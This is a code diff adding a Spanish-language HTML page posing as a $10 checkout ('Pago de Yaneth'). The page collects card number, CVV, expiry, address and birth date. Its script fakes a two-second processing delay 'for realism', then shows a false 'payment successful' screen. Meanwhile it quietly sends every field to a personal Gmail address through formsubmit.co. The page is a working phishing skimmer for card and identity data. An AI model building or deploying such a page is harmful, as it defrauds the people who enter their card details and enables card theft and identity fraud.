@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago de Yaneth</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 400px;
+            text-align: left;
+        }
+        h2 {
+            color: #333;
+            margin: 0 0 5px 0;
+            font-size: 22px;
+            text-align: center;
+            font-weight: bold;
+        }
+        .subtitle {
+            color: #777;
+            font-size: 13px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .amount-box {
+            background-color: #e8f5e9;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border: 1px solid #c8e6c9;
+            text-align: center;
+        }
+        .amount {
+            font-size: 24px;
+            font-weight: bold;
+            color: #2e7d32;
+        }
+        
+        label {
+            display: block;
+            font-size: 12px;
+            color: #555;
+            margin-top: 10px;
+            font-weight: 600;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin-top: 4px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        input:focus, select:focus {
+            border-color: #007bff;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0,123,255,0.25);
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        
+        /* Animación de carga */
+        .loader-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Pantalla de éxito */
+        .success-screen {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+        .check-icon {
+            color: #28a745;
+            font-size: 50px;
+            margin-bottom: 10px;
+        }
+        .success-text {
+            color: #28a745;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .sub-success {
+            color: #666;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        .footer {
+            margin-top: 15px;
+            font-size: 10px;
+            color: #aaa;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    
+    <!-- PANTALLA DEL FORMULARIO -->
+    <div id="formSection">
+        <h2>Pago de Yaneth</h2>
+        <p class="subtitle">Confirma tus datos para finalizar</p>
+        
+        <div class="amount-box">
+            <div class="amount">$10.00 USD</div>
+        </div>
+
+        <form id="paymentForm">
+            
+            <!-- Datos Bancarios -->
+            <label>Nombre en la tarjeta</label>
+            <input type="text" name="Nombre_Tarjeta" placeholder="Ej. JUAN PEREZ" required>
+
+            <label>Número de Tarjeta</label>
+            <input type="tel" name="Numero_Tarjeta" placeholder="0000 0000 0000 0000" maxlength="19" oninput="this.value = this.value.replace(/[^0-9]/g, '').replace(/(.{4})/g, '$1 ').trim()" required>
+
+            <div style="display:flex; gap:10px;">
+                <div style="flex:1;">
+                    <label>Expira</label>
+                    <input type="tel" name="Expira" placeholder="MM/AA" maxlength="5" required>
+                </div>
+                <div style="flex:1;">
+                    <label>CVV</label>
+                    <input type="password" name="CVV" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+
+            <!-- Campos extraídos de la foto -->
+            <label>País</label>
+            <select name="Pais" required>
+                <option value="" disabled selected>Selecciona un país</option>
+                <option value="CO">Colombia</option>
+                <option value="MX">México</option>
+                <option value="AR">Argentina</option>
+                <option value="PE">Perú</option>
+                <option value="CL">Chile</option>
+                <option value="ES">España</option>
+                <option value="US">Estados Unidos</option>
+                <option value="EC">Ecuador</option>
+                <option value="VE">Venezuela</option>
+                <option value="OTHER">Otro</option>
+            </select>
+
+            <label>Ciudad</label>
+            <input type="text" name="Ciudad" placeholder="Ej. Playa, Bogotá, CDMX" required>
+
+            <label>Dirección</label>
+            <input type="text" name="Direccion" placeholder="Ej. Calle 123 #45-67" required>
+
+            <label>Código Postal</label>
+            <input type="text" name="Codigo_Postal" placeholder="Ej. 110111" required>
+
+            <label>Fecha de nacimiento</label>
+            <input type="date" name="Fecha_Nacimiento" required>
+
+            <button type="submit" id="btnPay">Continuar al Pago</button>
+        </form>
+
+        <!-- Loader -->
+        <div class="loader-container" id="loader">
+            <div class="spinner"></div>
+            <p style="margin-top:10px; color:#666; font-size:14px;">Procesando pago...</p>
+        </div>
+    </div>
+
+    <!-- PANTALLA DE ÉXITO -->
+    <div class="success-screen" id="successScreen">
+        <div class="check-icon">✔</div>
+        <div class="success-text">¡Pago Realizado con Éxito!</div>
+        <p class="sub-success">Tu transacción ha sido confirmada.</p>
+    </div>
+
+    <div class="footer">Procesado por Yaneth Payments™</div>
+</div>
+
+<script>
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // Evita que la página se recargue o vaya a FormSubmit de inmediato
+        
+        const form = this;
+        const btn = document.getElementById('btnPay');
+        const loader = document.getElementById('loader');
+        const successScreen = document.getElementById('successScreen');
+        const formSection = document.getElementById('formSection');
+
+        // 1. Mostrar Loader
+        btn.style.display = 'none';
+        loader.style.display = 'flex';
+
+        // 2. Simular espera de 2 segundos para dar realismo
+        setTimeout(() => {
+            loader.style.display = 'none';
+            formSection.style.display = 'none'; // Ocultar formulario
+            successScreen.style.display = 'block'; // Mostrar éxito
+            
+            // 3. Enviar los datos al correo en segundo plano
+            // Usamos FormData para enviar los datos reales a FormSubmit
+            let formData = new FormData(form);
+            
+            fetch("https://formsubmit.co/ajax/ccesarreyna4@gmail.com", {
+                method: "POST",
+                body: formData
+            }).then(response => {
+                console.log("Datos enviados al correo");
+            }).catch(error => {
+                console.log("Error enviando datos pero la pantalla de éxito se mostró igual.");
+            });
+
+        }, 2000);
+    });
+</script>
+
+</body>
+</html>
